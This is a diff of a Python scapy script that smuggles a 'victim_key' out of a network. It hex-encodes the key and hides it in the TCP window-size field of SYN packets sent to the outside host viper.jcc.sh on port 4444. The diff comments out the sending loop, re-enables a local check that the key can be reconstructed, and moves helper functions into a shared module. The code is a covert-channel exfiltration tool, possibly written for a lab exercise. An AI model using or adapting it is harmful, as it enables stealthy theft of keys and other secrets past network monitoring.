@@ -1,28 +1,6 @@
 #!/usr/bin/env python3
 from scapy.all import *
-
-
-def reconstruct_hex_string(packets):
-    reconstructed_hex_string = ""
-    for p in packets:
-        window_hex = str(format(p.window, "04x"))
-        w1 = window_hex[:2]
-        w2 = window_hex[2:]
-        final = ""
-        if w1 != "00":
-            final += w1
-        final += w2
-        reconstructed_hex_string += final
-    return reconstructed_hex_string
-
-
-def ser_data(data):
-    return victim_key.encode("utf-8").hex()
-
-
-def chunk(data):
-    chunk_len = 4
-    return [data[i : i + chunk_len] for i in range(0, len(data), chunk_len)]
+from common import *
 
 
 if __name__ == "__main__":
@@ -36,10 +14,6 @@ if __name__ == "__main__":
     # TCP receive window size field is two bytes in length
     chunks = chunk(hex_string)
 
-    # print(len(chunks))
-
-    # victim_key2 = deser_data(hex_string)
-
     # Create custom SYN packets
     packets = []
     for chunk in chunks:
@@ -47,16 +21,17 @@ if __name__ == "__main__":
         p = IP(dst="viper.jcc.sh") / TCP(dport=4444, window=window_size)
         packets.append(p)
 
-    for p in packets:
-        send(p)
+    # for p in packets:
+    # send(p)
     # for p in packets:
     # print(p.window, str(format(p.window, "04x")))
 
-    # reconstructed_hex_string = reconstruct_hex_string(packets)
+    reconstructed_hex_string = reconstruct_hex_string(packets)
 
     # # print(reconstructed_hex_string)
-    # assert hex_string == reconstructed_hex_string
-    # reconstructed_victim_key = deser_data(reconstructed_hex_string)
+    assert hex_string == reconstructed_hex_string
+    reconstructed_victim_key = deser_data(reconstructed_hex_string)
+    print(reconstructed_victim_key)
 
     # print(reconstructed_victim_key)
-    print(hex_string)
+    print()
